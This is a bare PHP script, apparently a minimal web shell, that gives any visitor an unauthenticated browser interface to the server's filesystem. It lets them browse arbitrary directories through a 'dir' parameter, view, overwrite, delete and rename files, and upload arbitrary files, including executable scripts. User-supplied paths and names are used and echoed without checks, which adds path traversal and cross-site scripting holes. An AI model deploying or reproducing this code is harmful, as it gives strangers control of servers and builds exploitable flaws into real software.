<?php
session_start();

$directory = isset($_GET['dir']) ? realpath($_GET['dir']) : __DIR__;

function listDirectory($dir) {
    $items = array_diff(scandir($dir), ['.', '..']);
    echo "<h3>Contents of: $dir</h3><ul>";
    foreach ($items as $item) {
        $fullPath = "$dir/$item";
        $style = fileStyle($fullPath);
        echo "<li style='$style'>";
        if (is_dir($fullPath)) {
            echo "<a href='?dir=$fullPath'>$item</a>";
        } else {
            echo "$item - ";
            echo "<a href='?dir=$dir&action=edit&file=$item'>Edit</a> | ";
            echo "<a href='?dir=$dir&action=delete&file=$item'>Delete</a> | ";
            echo "<a href='?dir=$dir&action=rename&file=$item'>Rename</a>";
        }
        echo "</li>";
    }
    echo "</ul>";
}

function fileStyle($path) {
    return is_writable($path) ? "color: green;" : "color: red;";
}

function handleUpload($dir) {
    if (!empty($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], "$dir/" . $_FILES['file']['name']);
        echo "<p>File uploaded successfully!</p>";
    }
}

function createItem($dir, $name, $isFolder = false) {
    $path = "$dir/$name";
    if (!file_exists($path)) {
        $isFolder ? mkdir($path) : file_put_contents($path, '');
        echo "<p>$name created successfully!</p>";
    } else {
        echo "<p>$name already exists.</p>";
    }
}

function modifyFile($file) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        echo "<p>File saved successfully!</p>";
    }
    $content = file_exists($file) ? htmlspecialchars(file_get_contents($file)) : '';
    echo "<form method='POST'><textarea name='content' style='width:100%; height:300px;'>$content</textarea><br><button type='submit'>Save</button></form>";
}

function removeFile($file) {
    if (file_exists($file)) {
        unlink($file);
        echo "<p>File deleted successfully!</p>";
    }
}

function renameItem($file) {
    if (!empty($_POST['newName'])) {
        rename($file, dirname($file) . "/" . $_POST['newName']);
        echo "<p>File renamed successfully!</p>";
    } else {
        echo "<form method='POST'><input type='text' name='newName' placeholder='New Name'><button type='submit'>Rename</button></form>";
    }
}

if (!empty($_GET['action']) && !empty($_GET['file'])) {
    $file = "$directory/" . $_GET['file'];
    match ($_GET['action']) {
        'edit' => modifyFile($file),
        'delete' => removeFile($file),
        'rename' => renameItem($file)
    };
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_FILES['file'])) {
        handleUpload($directory);
    } elseif (!empty($_POST['folderName'])) {
        createItem($directory, $_POST['folderName'], true);
    } elseif (!empty($_POST['fileName'])) {
        createItem($directory, $_POST['fileName']);
    }
}

echo "<p>Current Directory: <strong>$directory</strong></p>";
echo "<a href='?dir=" . dirname($directory) . "'>Go Up</a>";
listDirectory($directory);

echo "<h3>Upload File</h3><form method='POST' enctype='multipart/form-data'><input type='file' name='file'><button type='submit'>Upload</button></form>";
echo "<h3>Create Folder</h3><form method='POST'><input type='text' name='folderName' placeholder='Folder Name'><button type='submit'>Create</button></form>";
echo "<h3>Create File</h3><form method='POST'><input type='text' name='fileName' placeholder='File Name'><button type='submit'>Create</button></form>";
?>
